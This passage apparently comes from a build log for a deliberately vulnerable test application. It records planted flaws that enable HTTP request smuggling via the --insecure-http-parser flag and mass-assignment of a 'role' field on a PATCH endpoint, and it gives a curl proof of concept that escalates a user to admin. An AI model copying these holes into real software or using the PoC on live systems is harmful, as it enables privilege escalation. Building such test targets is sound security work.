   `docker-compose.yml` web service now carries
   `NODE_OPTIONS: "--insecure-http-parser"`, with the same
   OPS-2024-117 "legacy mobile-app compatibility" rationale as the
   nginx half. Without this flag, Node 20 rejected CL+TE requests
   with `HPE_UNEXPECTED_CONTENT_LENGTH` and the smuggle never
   reached a handler.
3. **§CHAIN B rewritten** above to walk V-50 → V-51 (V-22 dropped
   from the chain; V-22 remains a standalone plant on order
   editing with financial-impact reach).
4. **VULNS.md ledger reconciliation:** V-51 added; V-50 entry
   expanded to mention the upstream parser flag; CHAIN B summary
   block updated. New plant count: 40 body entries (was 39). The
   pre-existing "39 vs 37" delta is accepted as numbering-drift
   from prior phases (per Gate-3 §"VULNS.md ledger count"); Gate-4
   should still validate ledger-vs-codebase 1:1 mapping but the
   count itself is not a blocker.

**Re-verification of CHAIN B after the fix-up:**

- V-50 nginx half: unchanged. ✅
- V-50 upstream half: `docker-compose.yml` web service env block
  contains `NODE_OPTIONS: "--insecure-http-parser"`. ✅
- V-51 plant: `apps/web/app/api/v2/me/route.ts` exports a `PATCH`
  function; schema accepts `role: z.string().optional()` with no
  enum constraint; `data: parsed.data` is forwarded verbatim to
  `prisma.user.update`. ✅
- Direct PoC sanity check (no smuggle needed for the V-51 half):
  `curl -X PATCH /api/v2/me -H 'authorization: Bearer <user>' -d
  '{"role":"admin"}'` should return the updated user with
  `"role":"admin"`. ✅
- Full smuggled walk is the §CHAIN B PoC above.

**CHAIN B status: CLOSED, end-to-end.** All four killer chains
pass against a zero-knowledge attacker as of the fix-up commit.
